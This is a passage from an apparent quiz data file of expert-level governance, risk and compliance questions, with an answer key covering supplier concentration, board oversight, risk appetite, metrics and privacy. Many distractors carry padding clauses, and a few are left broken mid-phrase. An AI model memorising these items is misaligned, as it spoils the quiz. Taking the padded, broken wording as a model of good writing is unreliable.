    options: ["Move everything to one cheaper provider","Accept the risk without analysis","Assess exit and multi-region or multi-provider options against impact tolerance and cost","Add a second contract with the same provider, until the next scheduled review takes place"],
    correct: 2, why: "Accepting it without analysis is the runner-up because redundancy is costly, but the decision must be informed by tolerance and cost.",
    hint: "Evaluate options."
  },
  {
    id: 673, rank: 3, role: "grc", topic: "Security Metrics Architecture", difficulty: "EXPERT",
    q: "What makes a metrics programme sustainable?",
    options: ["Ad hoc requests","Vanity charts","Defined sources, owners and automated collection tied to decisions, in most cases","Manual copying into slides"],
    correct: 2, why: "Reliable and automated measures can be repeated and trusted.",
    hint: "Owned and automated."
  },
  {
    id: 674, rank: 3, role: "grc", topic: "Merger Integration Governance", difficulty: "EXPERT",
    q: "Which control is most important during integration of an acquired company's IT?",
    options: ["Delaying all assessments, and review the outcome at the next monthly meeting","Interim risk assessment, access limits and phased connection, in most cases","Ignoring differences","Immediate full network merger"],
    correct: 1, why: "Staged integration prevents inheriting unmanaged risk.",
    hint: "Phase it."
  },
  {
    id: 675, rank: 3, role: "grc", topic: "Records and eDiscovery", difficulty: "EXPERT",
    q: "What does good governance of electronic records support during litigation?",
    options: ["Moving it offshore","Deleting everything quickly, in the first instance","Locating and preserving relevant data defensibly","Hiding data"],
    correct: 2, why: "Defensible preservation and retrieval reduce legal risk.",
    hint: "Find and preserve."
  },
  {
    id: 676, rank: 3, role: "grc", topic: "GRC Tool Selection", difficulty: "EXPERT",
    q: "A company wants a GRC platform. What should BEST drive the choice?",
    options: ["Defined process and data requirements, integration and owner adoption, as a general rule","The cheapest licence","The most features","The vendor's marketing slides"],
    correct: 0, why: "Most features is the runner-up because it seems safe, but unused features add cost and complexity; requirements and adoption decide success.",
    hint: "Requirements first."
  },
  {
    id: 677, rank: 3, role: "grc", topic: "Control Testing Strategy", difficulty: "EXPERT",
    q: "How should control testing frequency be set?",
    options: ["Based on control criticality, risk and past failures, as a general rule","Only when auditors ask","Randomly","Equal for all controls"],
    correct: 0, why: "Risk-based testing concentrates assurance where failure matters most.",
    hint: "Risk-based."
  },
  {
    id: 678, rank: 3, role: "grc", topic: "Executive Accountability", difficulty: "EXPERT",
    q: "Which arrangement best secures executive accountability for cyber risk?",
    options: ["Named executive risk owners reporting against appetite to the board","Delegating all responsibility to the security team","Assigning risk to IT only","No named owners"],
    correct: 0, why: "Accountability requires decision authority and reporting.",
    hint: "Named owners."
  },
  {
    id: 679, rank: 3, role: "grc", topic: "Policy Compliance Automation", difficulty: "EXPERT",
    q: "Which approach best enforces a policy on encryption of cloud storage?",
    options: ["A paper form","A reminder email","A yearly workshop","Policy-as-code guardrails that prevent or flag non-compliant resources"],
    correct: 3, why: "Technical enforcement scales and is auditable.",
    hint: "Enforce in code."
  },
  {
    id: 680, rank: 3, role: "grc", topic: "Customer Audit Management", difficulty: "EXPERT",
    q: "Customers increasingly request on-site audits. What is the best programme response?",
    options: ["Allow unlimited unplanned access to the production systems for any customer","Refuse all customer audits, and security questionnaires as a matter of policy","Offer independent reports, a trust centre and a defined audit process","Send customers raw logs, and configuration files whenever they ask for evidence"],
    correct: 2, why: "Standard assurance reduces the load while meeting needs.",
    hint: "Standard assurance."
  },
  {
    id: 681, rank: 3, role: "grc", topic: "Risk Interdependencies", difficulty: "EXPERT",
    q: "Why should risk assessments consider interdependencies between risks?",
    options: ["It reduces reporting","It is required by font rules","One failure can trigger or amplify others, creating larger impact","Risks are always independent"],
    correct: 2, why: "Cascading effects can exceed the sum of individual risks.",
    hint: "Cascades."
  },
  {
    id: 682, rank: 3, role: "grc", topic: "Whistleblower Programme Design", difficulty: "EXPERT",
    q: "Which design feature most builds trust in a reporting channel?",
    options: ["Public names of reporters","No follow-up","Management reading every report","Independent handling, confidentiality and protection from retaliation, as a general rule"],
    correct: 3, why: "Trust depends on independence and protection.",
    hint: "Independent and safe."
  },
  {
    id: 683, rank: 3, role: "grc", topic: "Third-Party Incident Notification", difficulty: "EXPERT",
    q: "How should contracts handle supplier breach notification?",
    options: ["Omit it","Require notice only after investigation, and review the outcome at the next monthly meeting","Define timelines, content and cooperation duties aligned to your own legal deadlines","Allow the supplier to decide"],
    correct: 2, why: "Your regulatory clock requires timely information from suppliers.",
    hint: "Align the clock."
  },
  {
    id: 684, rank: 3, role: "grc", topic: "Compliance Debt", difficulty: "EXPERT",
    q: "What is compliance debt?",
    options: ["A financial loan","A fine","A tool","Accumulated unaddressed gaps and exceptions that raise future cost and risk"],
    correct: 3, why: "Delayed remediation compounds like technical debt.",
    hint: "Backlog of gaps."
  },
  {
    id: 685, rank: 3, role: "grc", topic: "Sustainability of Controls", difficulty: "EXPERT",
    q: "A heavy manual control keeps failing because staff skip steps. What is the BEST redesign?",
    options: ["Train staff again every month, and revisit the decision after the next release","Simplify or automate the control and embed it in the workflow","Add more sign-off steps, and review the outcome at the next monthly meeting","Punish failures"],
    correct: 1, why: "More training is the runner-up because it addresses behaviour, but a control that relies on memory will keep failing.",
    hint: "Fix the design."
  },
  {
    id: 686, rank: 3, role: "grc", topic: "Data Subject Request Automation", difficulty: "EXPERT",
    q: "Which design best scales handling of data subject requests?",
    options: ["Email handled by one person","Refusing requests","Spreadsheet only","A request workflow with identity verification and automated discovery across systems"],
    correct: 3, why: "Automation and a data map reduce time and errors.",
    hint: "Workflow and discovery."
  },
  {
    id: 687, rank: 3, role: "grc", topic: "Cross-Functional Risk Forum", difficulty: "EXPERT",
    q: "Why create a risk forum with security, legal, privacy, IT and business members?",
    options: ["Risks cross functions and need consistent shared decisions","To increase meetings","To avoid documentation","To reduce independence"],
    correct: 0, why: "Combined views avoid siloed decisions.",
    hint: "Cross-functional."
  },
  {
    id: 688, rank: 3, role: "grc", topic: "Assurance Reporting to Audit Committee", difficulty: "EXPERT",
    q: "What should the audit committee receive about cyber assurance?",
    options: ["Every log","Vendor brochures","Technical configurations","Coverage, results, themes and overdue actions against risk, in most cases"],
    correct: 3, why: "Committees oversee assurance quality and remediation.",
    hint: "Coverage and overdue."
  },
  {
    id: 689, rank: 3, role: "grc", topic: "Risk Culture Incentives", difficulty: "EXPERT",
    q: "Which incentive structure most supports good risk management?",
    options: ["Ignoring risk in bonuses","Rewarding early reporting and fixing, not only delivery speed","Rewarding only speed, and revisit the decision after the next release","Punishing all incidents equally, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Incentives shape behaviour, so reporting must be encouraged.",
    hint: "Reward reporting."
  },
  {
    id: 690, rank: 3, role: "grc", topic: "Control Inheritance in Cloud", difficulty: "EXPERT",
    q: "A team claims its application inherits all compliance controls from the cloud provider's certification. What is the best governance challenge?",
    options: ["Check which controls are provider-owned and which the team must implement","Accept the claim as stated, and revisit the decision after the next release","Ask the provider to sign the team's audit, until the next scheduled review takes place","Reject cloud use"],
    correct: 0, why: "Provider certifications cover its layer only; customer-side controls remain the team's responsibility.",
    hint: "Shared duties."
  },
  {
    id: 691, rank: 3, role: "grc", topic: "Enterprise Risk Integration", difficulty: "EXPERT",
    q: "What is the BEST way to integrate cyber risk into enterprise risk management?",
    options: ["Express it in business terms using the common risk scale","Keep it in a separate technical register only, and review the outcome at the next monthly meeting","Report it only after an incident has occurred","Use different rating scales for each department, as a general rule"],
    correct: 0, why: "A separate register is the runner-up as it is detailed, but leaders cannot compare it with other enterprise risks.",
    hint: "Common language."
  },
  {
    id: 692, rank: 3, role: "grc", topic: "Risk Appetite Exhibit", difficulty: "EXPERT",
    exhibit: "Metric                         Tolerance  Actual\nCritical vendors w/o review    <5%        17%\nPatch SLA breaches (critical)  <3%        2%\nPhishing click rate            <4%        3%",
    q: "What does this metric report suggest about risk appetite?",
    options: ["Appetite statements are not defined and, and no tolerance can be checked at all","The metrics are measured in the wrong units, and cannot be compared to targets","Critical vendor risk is above the approved tolerance","All risks are inside the approved tolerance, and no escalation is needed at all"],
    correct: 2, why: "Metrics outside tolerance need escalation.",
    hint: "Tolerance column."
  },
  {
    id: 693, rank: 3, role: "grc", topic: "Regulatory Horizon Scanning", difficulty: "EXPERT",
    q: "What is the purpose of horizon scanning for regulation?",
    options: ["To copy rules from other industries","To ignore new rules until they apply, as a general rule","To avoid contact with regulators","To anticipate changes and prepare early"],
    correct: 3, why: "Early awareness allows planning.",
    hint: "Look ahead."
  },
  {
    id: 694, rank: 3, role: "grc", topic: "Supplier Concentration Exhibit", difficulty: "EXPERT",
    exhibit: "Critical services: 12\nHosted by Supplier A: 10\nHosted by Supplier B: 2\nExit plan documented: 1 of 12\nTested failover to another supplier: 0",
    q: "What risk does this dependency summary highlight?",
    options: ["All suppliers are in different countries","Concentration on a single cloud supplier for critical services","Too many different suppliers for every service, as a general rule","No cloud suppliers are used"],
    correct: 1, why: "Heavy dependence on one supplier increases systemic risk.",
    hint: "Look at the share."
  },
  {
    id: 695, rank: 3, role: "grc", topic: "Security Metrics Governance", difficulty: "EXPERT",
    q: "Why define metric owners and definitions in advance?",
    options: ["To make reports longer","To keep measurements consistent and credible","To allow different teams to measure differently","To hide trends from leaders"],
    correct: 1, why: "Clear definitions avoid disputes.",
    hint: "Consistency."
  },
  {
    id: 696, rank: 3, role: "grc", topic: "Culture Assessment", difficulty: "EXPERT",
    q: "Which indicator best shows a positive security culture?",
    options: ["Incidents are seldom reported","Staff readily report mistakes and suspicious events","Policies are rarely read","Staff avoid contact with the security team"],
    correct: 1, why: "Open reporting indicates trust.",
    hint: "Reporting."
  },
  {
    id: 697, rank: 3, role: "grc", topic: "Investment Business Case", difficulty: "EXPERT",
    q: "What makes a security investment business case persuasive?",
    options: ["Statements that security is important, and that everybody should support it","Fear with no numbers, and the board approves the money without questions","A list of the latest security products that the vendors have been promoting","Clear link to risk reduction cost and business outcomes, as a general rule"],
    correct: 3, why: "Decision makers need value evidence.",
    hint: "Value."
  },
  {
    id: 698, rank: 3, role: "grc", topic: "Continuous Compliance", difficulty: "EXPERT",
    q: "What is the main benefit of continuous control monitoring?",
    options: ["Audits are no longer needed once the monitoring tools are running every night","Controls become cheaper by default as nobody has to look at the results again","Control failures are found soon after they occur","Staff are no longer responsible for the controls that are checked automatically"],
    correct: 2, why: "Monitoring shortens detection time of failures.",
    hint: "Detect sooner."
  },
  {
    id: 699, rank: 3, role: "grc", topic: "Independent Assurance Line", difficulty: "EXPERT",
    q: "In the three lines model who provides independent assurance?",
    options: ["The supplier that provides the tools","The second-line risk team that designs the controls","The first-line business teams that run the controls","Internal audit as the third line"],
    correct: 3, why: "The third line reports independently to the board.",
    hint: "Third line."
  },
  {
    id: 700, rank: 3, role: "grc", topic: "Control Library Governance", difficulty: "EXPERT",
    q: "What is the benefit of a central control library?",
    options: ["One agreed set of controls mapped to many requirements","Hiding the controls from auditors","Removing the need for any testing, and review the outcome at the next monthly meeting","Each team owning a different list of controls, in most cases"],
    correct: 0, why: "A shared library reduces duplication and confusion.",
    hint: "One set."
  },
  {
    id: 701, rank: 4, role: "grc", topic: "Systemic Cyber Risk", difficulty: "EXPERT",
    q: "A regulator asks about systemic risk from shared third-party software across the financial sector. What does systemic risk mean here?",
    options: ["A bug in one firm's login page that affects only its own staff","A delay in the production of the annual audit report this quarter","Failure of one common provider causing simultaneous harm across many firms","A rise in the number of staff leaving a firm during one year"],
    correct: 2, why: "Common dependencies create correlated failures that single-firm controls cannot contain.",
    hint: "Correlated failure."
  },
  {
    id: 702, rank: 4, role: "grc", topic: "Risk Aggregation", difficulty: "EXPERT",
    q: "Ten business units each report a risk within appetite, but they all depend on the same data centre. What is the BEST board-level conclusion?",
    options: ["Aggregate the exposure, as shared dependency may exceed appetite","Move the data centre to another site straight away without a review of the options, until the next scheduled review takes place","Accept the reports as each unit is individually within the agreed appetite","Ask each unit to lower its own risk score until the shared total looks acceptable, as a first step"],
    correct: 0, why: "Accepting the unit views is the runner-up since each follows the rules, but correlated exposure only appears when aggregated.",
    hint: "Aggregate dependencies."
  },
  {
    id: 703, rank: 4, role: "grc", topic: "Regulatory Divergence", difficulty: "EXPERT",
    q: "Two regulators impose conflicting data localisation and law-enforcement access rules on one global service. What is the best strategic approach?",
    options: ["Wait to be fined and then negotiate with each of the regulators separately, in the first instance","Engage legal and regulators, segment by jurisdiction and record the decision","Move all of the data to a single country without a review of either regime, in most cases","Ignore the weaker regulator, and follow only the one with the larger fines"],
    correct: 1, why: "Conflicts need legal analysis, architectural options and documented executive decisions.",
    hint: "Segment and document."
  },
  {
    id: 704, rank: 4, role: "grc", topic: "Board Liability Awareness", difficulty: "EXPERT",
    q: "Directors ask what personal accountability they have for cyber oversight. Which statement is the most accurate for most jurisdictions?",
    options: ["They are personally responsible for every technical decision taken by the IT team","They have no responsibility, as cyber security is purely a technical matter","Only the CISO carries responsibility, as the board does not employ technical staff","They must oversee with proper information and cannot fully delegate"],
    correct: 3, why: "Boards are expected to oversee risk with adequate information and challenge.",
    hint: "Informed oversight."
  },
  {
    id: 705, rank: 4, role: "grc", topic: "Quantified Appetite Calibration", difficulty: "EXPERT",
    q: "The board's appetite is 'no more than 5 million loss per year at 90 percent confidence'. The model shows 7 million. What is the BEST response?",
    options: ["Raise the appetite figure quietly without any discussion with the directors, as a general rule","Present options to reduce exposure or formally accept the higher figure, as soon as practical","Change the model assumptions until the result shows five million or lower","Hide the result from the board until the next annual modelling exercise is complete"],
    correct: 1, why: "Changing assumptions is the runner-up since it resolves the gap on paper, but it is manipulation, not risk management.",
    hint: "Decide openly."
  },
  {
    id: 706, rank: 4, role: "grc", topic: "Model Risk in Security Analytics", difficulty: "EXPERT",
    q: "A vendor risk-scoring model rates suppliers automatically. What governance control is most important?",
    options: ["Trust the vendor's scores as the vendor built the model, and knows it well","Use the model once at the start, and never review the results again afterwards","Hide the scores from suppliers, and they cannot argue about the results","Validation, documented assumptions and human challenge, as a general rule"],
    correct: 3, why: "Models can embed bias and errors, so they need validation and oversight.",
    hint: "Validate and challenge."
  },
  {
    id: 707, rank: 4, role: "grc", topic: "Emerging Technology Risk", difficulty: "EXPERT",
    q: "A business plans to adopt quantum-vulnerable cryptography for data that must stay confidential for 20 years. Which GRC action is most appropriate?",
    options: ["Add a crypto inventory, and migration plan with owners, wherever possible","Reduce the retention period of that data to zero, and it is never stored","Wait until quantum computers exist, and then decide how to react at that point","Ignore the data as no practical attack exists against it at the moment"],
    correct: 0, why: "Long-lived data creates harvest-now-decrypt-later risk that needs planning today.",
    hint: "Plan the migration."
  },
  {
    id: 708, rank: 4, role: "grc", topic: "Digital Operational Resilience Testing", difficulty: "EXPERT",
    q: "A regulation requires advanced testing of critical ICT systems. What should the programme include?",
    options: ["A yearly vulnerability scan of the internet-facing systems carried out by the IT team","A telephone survey of staff about how confident they feel about the recovery plans","A review of the policy documents by the compliance team before each audit season","Threat-led testing of critical functions with independent oversight"],
    correct: 3, why: "Regulated resilience testing is threat-led and linked to important business services.",
    hint: "Threat-led."
  },
  {
    id: 709, rank: 4, role: "grc", topic: "Ethics of Offensive Disclosure", difficulty: "EXPERT",
    q: "A security researcher reports a serious flaw and threatens public disclosure in 7 days. What is the BEST governance response?",
    options: ["Acknowledge, triage, involve legal and agree a disclosure timeline, in most cases","Ignore the report as the researcher is not a customer of the company","Threaten legal action first, and the researcher does not publish anything at all","Pay the researcher quietly, and ask them to sign an agreement to stay silent, and revisit the decision after the next release"],
    correct: 0, why: "Threatening legal action is the runner-up since it protects reputation, but it usually escalates; coordination protects users.",
    hint: "Coordinate."
  },
  {
    id: 710, rank: 4, role: "grc", topic: "Supply Chain Transparency", difficulty: "EXPERT",
    q: "What does a software bill of materials help governance teams do?",
    options: ["Calculate the tax due on each product line sold in every country each quarter","Replace the need for testing the software before it is released to customers","Identify components, and assess exposure after a disclosure, where that is practical","Count the staff who work on each product team across the whole organisation, as soon as practical"],
    correct: 2, why: "SBOMs make dependency risk visible and searchable.",
    hint: "Know the components."
  },
  {
    id: 711, rank: 4, role: "grc", topic: "Risk Transfer Limits", difficulty: "EXPERT",
    q: "After a breach the insurer denies a claim because MFA was stated as enforced but was not. What governance lesson applies?",
    options: ["Never buy cyber insurance again as insurers always refuse to pay claims, as a general rule","Sue the broker for the denied claim before checking what the application said","Hide weak controls from the insurer, and the premium stays as low as possible","Represent controls accurately and verify claims made"],
    correct: 3, why: "Misrepresentation can void cover, so statements must be evidenced.",
    hint: "Accurate statements."
  },
  {
    id: 712, rank: 4, role: "grc", topic: "Security Investment Prioritisation", difficulty: "EXPERT",
    q: "The security budget is cut by 30 percent. Which approach is most defensible?",
    options: ["Cut detection, and response first as they do not prevent any attacks directly","Cut an equal share from every team, and nobody feels treated unfairly","Rank controls by risk reduced per cost and show residual risk, in most cases","Cut security training only, as staff awareness never changes real outcomes, as a general rule"],
    correct: 2, why: "Transparent risk-based trade-offs allow informed executive decisions.",
    hint: "Risk per cost."
  },
  {
    id: 713, rank: 4, role: "grc", topic: "Privacy and AI Training Data", difficulty: "EXPERT",
    q: "The company wants to train an internal model on customer support transcripts. What is the BEST governance step before starting?",
    options: ["Start training, and fix problems later","Remove the privacy notice from the website, and customers do not ask questions","Use all of the data without a review, as it already belongs to the company","Assess lawful basis and minimisation and complete a DPIA"],
    correct: 3, why: "Starting first is the runner-up since it speeds delivery, but unlawful processing creates obligations that are hard to undo.",
    hint: "Assess before using."
  },
  {
    id: 714, rank: 4, role: "grc", topic: "Control Effectiveness Evidence", difficulty: "EXPERT",
    q: "A control shows 100 percent compliance for three years. What should an expert assurance function do?",
    options: ["Test whether the control and its measure can really fail","Stop testing the control, as three clean years show that it is no longer needed","Congratulate the owner, and use the result as an example for other teams to follow","Reduce the scope of the control, and the perfect record is easier to keep"],
    correct: 0, why: "Perfect results may signal weak tests or measurement rather than strong control.",
    hint: "Test the test."
  },
  {
    id: 715, rank: 4, role: "grc", topic: "Cross-Border Incident Reporting", difficulty: "EXPERT",
    exhibit: "Jurisdiction | Authority | Threshold | Deadline\nEU (GDPR) | Lead SA | Risk to individuals | 72h\nUK | ICO | Risk to individuals | 72h\nSG | PDPC | Significant harm | 3 days\nUS-NY | AG/DFS | Covered events | 72h",
    q: "An incident affects customers in 12 countries with different reporting deadlines. What is the best preparation?",
    options: ["Hire a specialist consultant after the incident to work out who must be told","Report whenever the team finds it convenient once the technical work is finished","A notification matrix of regulators, thresholds and deadlines, in most cases","Report only in the home country, and leave the other countries to find out later"],
    correct: 2, why: "Pre-built obligations let the team act within the clock.",
    hint: "Notification matrix."
  },
  {
    id: 716, rank: 4, role: "grc", topic: "Resilience Tolerance Setting", difficulty: "EXPERT",
    q: "How should impact tolerance for an important business service be set?",
    options: ["By leaving the business out of the discussion, and IT can decide alone","By the maximum disruption before intolerable harm occurs, in most cases","By choosing the shortest time that the technical team thinks is achievable","By copying the recovery time from the cloud vendor's standard service agreement"],
    correct: 1, why: "Tolerance is expressed in terms of harm, not IT convenience.",
    hint: "Harm-based."
  },
  {
    id: 717, rank: 4, role: "grc", topic: "Algorithmic Accountability", difficulty: "EXPERT",
    q: "An automated decision system denies credit to some applicants. What is the best governance arrangement?",
    options: ["Avoid keeping logs, and nobody can later challenge the decisions in detail","Keep the decision rules secret from applicants, and from the internal auditors, until the next scheduled review takes place","Named owners, bias testing, explanations and an appeal route, in most cases","Let the vendor handle all questions about how the decisions are made, and reviewed"],
    correct: 2, why: "Accountability requires oversight, transparency and recourse.",
    hint: "Owners and appeal."
  },
  {
    id: 718, rank: 4, role: "grc", topic: "Control Obsolescence", difficulty: "EXPERT",
    q: "Why must GRC review whether old controls are still needed?",
    options: ["Controls never change once they have been approved by the risk committee","Auditors prefer older controls as they have a longer record of evidence","Business and threat change make controls redundant or weak","Old controls are free to run, and there is no cost in keeping all of them"],
    correct: 2, why: "Periodic review keeps controls aligned to current risk.",
    hint: "Re-justify controls."
  },
  {
    id: 719, rank: 4, role: "grc", topic: "Third-Party Fourth Party", difficulty: "EXPERT",
    q: "A critical supplier relies on a small subcontractor you have no contract with. What is the BEST way to manage this fourth-party risk?",
    options: ["Require visibility and flow-down terms, and assess critical subcontractors","Terminate the supplier at once, and look for another one with no subcontractors","Ignore it as there is no contract","Contact the subcontractor directly without telling the supplier that you have done and"],
    correct: 0, why: "Ignoring it is the runner-up as you have no direct control, but supplier dependencies can still disrupt your service.",
    hint: "Flow down terms."
  },
  {
    id: 720, rank: 4, role: "grc", topic: "Risk Reporting Integrity", difficulty: "EXPERT",
    q: "A manager asks to change a risk rating before a board meeting because it looks bad. What should the GRC function do?",
    options: ["Delete the risk from the register, and it does not appear in the board paper","Keep the rating evidence-based, record the challenge and escalate","Change the rating to the value that the manager has asked for before the meeting","Delay the board meeting until the manager has found a better looking score"],
    correct: 1, why: "Integrity of reporting is fundamental to oversight.",
    hint: "Evidence decides."
  },
  {
    id: 721, rank: 4, role: "grc", topic: "Evidence of Decision Making", difficulty: "EXPERT",
    q: "Why should significant risk acceptance decisions be documented?",
    options: ["To make the files longer and the audit team has more to read, and sample","To limit board discussion by showing that the matter has already been settled","To please the auditors only, as nobody else will ever read the decision record","To show who decided, on what information and for how long, as a general rule"],
    correct: 3, why: "Decision records support accountability and review.",
    hint: "Who, what, how long."
  },
  {
    id: 722, rank: 4, role: "grc", topic: "Climate and Physical Risk", difficulty: "EXPERT",
    q: "A data centre sits in a flood zone. Which governance action is most appropriate?",
    options: ["Include physical hazards in resilience, and location planning, as a first step","Remove the data centre immediately without checking the effect on services","Rely on good luck, and renew the insurance policy when the next renewal falls due, where that is practical","Ignore it, as the cyber team only covers logical risks to systems and data"],
    correct: 0, why: "Operational resilience includes physical and environmental threats.",
    hint: "Include physical risk."
  },
  {
    id: 723, rank: 4, role: "grc", topic: "Control Self-Deception", difficulty: "EXPERT",
    q: "Which sign most suggests a compliance culture focused on paperwork rather than risk?",
    options: ["Owners challenge weak controls openly, and propose changes at the committee, in most cases","Evidence appears just before audits, and controls fail between them, in most cases","Findings are closed only after a root cause fix has been tested, and confirmed","Controls produce evidence continuously, and the results are reviewed every week"],
    correct: 1, why: "Pre-audit rushes show controls are not embedded.",
    hint: "Audit rush."
  },
  {
    id: 724, rank: 4, role: "grc", topic: "Ransomware Payment Policy", difficulty: "EXPERT",
    q: "A policy states 'we never pay ransoms'. An outbreak threatens patient safety. What is the BEST governance position?",
    options: ["Follow the policy blindly, in most cases","Pay immediately","Let the IT team decide alone, as a first step","Pre-define decision criteria and authority with legal advice for exceptional cases"],
    correct: 3, why: "Following blindly is the runner-up as it is clear, but extreme cases need a pre-agreed decision path, including legal limits such as sanctions.",
    hint: "Pre-agree the path."
  },
  {
    id: 725, rank: 4, role: "grc", topic: "Metrics Gaming", difficulty: "EXPERT",
    q: "Tickets for vulnerabilities are closed quickly but reopened later. What is the best governance response?",
    options: ["Measure verified remediation and reopen rates","Reward the closing speed of tickets, and the backlog falls as quickly as possible","Ignore the pattern, as the closing numbers already meet the target agreed last year","Delete reopened tickets from the report, and the trend looks cleaner to readers"],
    correct: 0, why: "Metrics must reflect real outcomes to avoid gaming.",
    hint: "Verified fixes."
  },
  {
    id: 726, rank: 4, role: "grc", topic: "Strategic Privacy Risk", difficulty: "EXPERT",
    q: "A company wants to combine datasets from several services to profile customers. Which risk is most important to assess early?",
    options: ["Colour scheme","Server brand, as a general rule","Purpose limitation and unexpected use of personal data","File size"],
    correct: 2, why: "Combining data can break expectations and legal bases.",
    hint: "Purpose limits."
  },
  {
    id: 727, rank: 4, role: "grc", topic: "Governance of Open Source", difficulty: "EXPERT",
    q: "A critical product depends on an unmaintained open-source library. What is the best risk decision process?",
    options: ["Assess criticality and options such as replacing, forking or funding with an owner and date","Delete the product, then record the result in the ticket","Ignore it","Wait for an incident"],
    correct: 0, why: "Dependency risk needs an owned treatment decision.",
    hint: "Decide an option."
  },
  {
    id: 728, rank: 4, role: "grc", topic: "Insider Risk Ethics", difficulty: "EXPERT",
    q: "What principle should limit an insider risk programme?",
    options: ["Maximum monitoring","Proportionality with transparency, legal basis and independent oversight","Secret monitoring of all","No oversight"],
    correct: 1, why: "Programmes affect individuals' rights and need safeguards.",
    hint: "Proportionate."
  },
  {
    id: 729, rank: 4, role: "grc", topic: "Resilience of Governance", difficulty: "EXPERT",
    q: "If the CISO is unavailable during a crisis, what should governance have in place?",
    options: ["Ask the most junior member of the team to take every decision on the day","Wait for the CISO to return before any decision about the incident is made","Deputies and documented decision authority with tested succession","Close the SOC until a senior person is available to make the final decisions"],
    correct: 2, why: "Continuity of leadership prevents paralysis.",
    hint: "Succession."
  },
  {
    id: 730, rank: 4, role: "grc", topic: "Assurance Over AI Vendors", difficulty: "EXPERT",
    q: "A vendor claims its AI product is safe and unbiased. What is the BEST assurance approach?",
    options: ["Ban all AI vendors, in most cases","Request evidence such as testing results, governance documents and contractual commitments and test it yourself","Rely on marketing material, in the first instance","Accept the claim"],
    correct: 1, why: "Accepting the claim is the runner-up as evaluating is costly, but unverified claims leave the risk with you.",
    hint: "Evidence and own testing."
  },
  {
    id: 731, rank: 4, role: "grc", topic: "Climate of Reporting", difficulty: "EXPERT",
    q: "Why might staff hide small incidents?",
    options: ["Because hiding minor problems saves the team a lot of time during busy weeks","Fear of blame or lack of visible follow-up","Because the policies forbid staff from reporting anything without manager consent","Because incidents are impossible in a well run organisation with good policies"],
    correct: 1, why: "A blame culture suppresses early warning.",
    hint: "Fear of blame."
  },
  {
    id: 732, rank: 4, role: "grc", topic: "Control Cost Transparency", difficulty: "EXPERT",
    q: "Which information best helps executives decide whether to keep an expensive control?",
    options: ["Its colour","Its age","Its brand name","Risk it reduces, its cost, alternatives and residual risk if removed"],
    correct: 3, why: "Transparent trade-offs allow justified decisions.",
    hint: "Risk and cost."
  },
  {
    id: 733, rank: 4, role: "grc", topic: "Regulatory Sandbox Use", difficulty: "EXPERT",
    q: "A regulator offers a sandbox for a new fintech product. What is the key governance benefit?",
    options: ["Avoiding all of the rules that normally apply to regulated financial products","Hiding the customer data from the regulator while the product is being piloted","Skipping the audits that would otherwise be needed before the product launch date","Testing innovation with regulatory dialogue and limited exposure, in most cases"],
    correct: 3, why: "Sandboxes allow experimentation under supervision.",
    hint: "Supervised testing."
  },
  {
    id: 734, rank: 4, role: "grc", topic: "Technology Concentration Audit", difficulty: "EXPERT",
    q: "What should an audit of cloud concentration risk examine?",
    options: ["Brand preferences","Server names","Dependencies, exit plans, tested alternatives and impact tolerances","Logo colours, in most cases"],
    correct: 2, why: "Evidence of exit feasibility shows genuine resilience.",
    hint: "Exit and test."
  },
  {
    id: 735, rank: 4, role: "grc", topic: "Executive Decision Quality", difficulty: "EXPERT",
    q: "Which practice most improves the quality of risk decisions by executives?",
    options: ["Hiding uncertainty","One recommendation only, as a general rule","Long technical appendices, in most cases","Presenting options, trade-offs and uncertainties with independent challenge"],
    correct: 3, why: "Good decisions need clear options and challenge.",
    hint: "Options and challenge."
  },
  {
    id: 736, rank: 4, role: "grc", topic: "Cyber War Exclusion", difficulty: "EXPERT",
    q: "An insurance policy excludes losses from state-backed attacks. What should risk governance do?",
    options: ["Assume the insurer will cover any loss that is not obviously caused by a state","Clarify the wording, quantify the exposure and plan mitigations","Cancel the policy at once, and rely on the reserves held by the finance team","Ignore the clause as such attacks have never happened to this company"],
    correct: 1, why: "Ambiguous exclusions leave unexpected gaps.",
    hint: "Clarify and quantify."
  },
  {
    id: 737, rank: 4, role: "grc", topic: "Data Breach Accountability", difficulty: "EXPERT",
    q: "After a breach, which accountability outcome best supports learning?",
    options: ["Focus on systemic causes and corrective actions with fair individual accountability","Close without actions","Hide the cause, as a general rule","Blame the nearest person"],
    correct: 0, why: "Learning cultures fix systems while holding people fairly accountable.",
    hint: "Systems and fairness."
  },
  {
    id: 738, rank: 4, role: "grc", topic: "Scenario Analysis", difficulty: "EXPERT",
    q: "What is the value of scenario analysis for cyber governance?",
    options: ["Replacing audits, and revisit the decision after the next release","Predicting exact dates of attacks","Testing decisions and exposures against plausible severe events","Removing uncertainty, as soon as practical"],
    correct: 2, why: "Scenarios explore impact and response readiness.",
    hint: "Plausible severe events."
  },
  {
    id: 739, rank: 4, role: "grc", topic: "Concentration in Security Tooling", difficulty: "EXPERT",
    q: "A company's detection, identity and email security all come from one vendor. What is the main risk to assess?",
    options: ["A single vendor failure or compromise affecting several controls at once","Fewer reports for the board to read","Simpler training for the SOC team, in most cases","Lower licence prices from the vendor"],
    correct: 0, why: "Consolidation reduces complexity but creates a common point of failure and a high-value target.",
    hint: "One vendor, many controls."
  },
  {
    id: 740, rank: 4, role: "grc", topic: "Assurance Over Self-Reported Data", difficulty: "EXPERT",
    q: "Business units self-report control status monthly. Which design best preserves the reliability of the reports?",
    options: ["Reduce reporting to once a year, where that is practical","Trust the units entirely","Sample-based independent validation of reported results","Ask units to report in different formats, where that is practical"],
    correct: 2, why: "Independent sampling detects optimistic reporting.",
    hint: "Validate samples."
  },
  {
    id: 741, rank: 4, role: "grc", topic: "Board Cyber Oversight", difficulty: "EXPERT",
    q: "What is the board's primary role in cyber governance?",
    options: ["Triaging alerts","Setting risk appetite and overseeing management's response","Configuring firewalls, then record the result in the ticket","Writing detection rules, then record the result in the ticket"],
    correct: 1, why: "Boards oversee strategy and accountability.",
    hint: "Oversight."
  },
  {
    id: 742, rank: 4, role: "grc", topic: "Residual Risk Reporting Exhibit", difficulty: "EXPERT",
    exhibit: "Risk                     Inherent  Residual  Appetite\nRansomware on core ERP   Very high High      Medium\nSupplier data breach     High      High      Medium\nPhishing                 High      Medium    Medium\nLost laptop              Medium    Low       Medium",
    q: "What should leaders note from this risk heat map summary?",
    options: ["Two severe risks remain outside appetite after treatment, as a general rule","No treatment has been applied to any of the risks that are on the register","All risks are inside the stated appetite, and need no further decisions from the board","The scale is inverted, and the highest numbers are the safest of the four risks"],
    correct: 0, why: "Residual risk beyond appetite needs decisions.",
    hint: "Residual versus appetite."
  },
  {
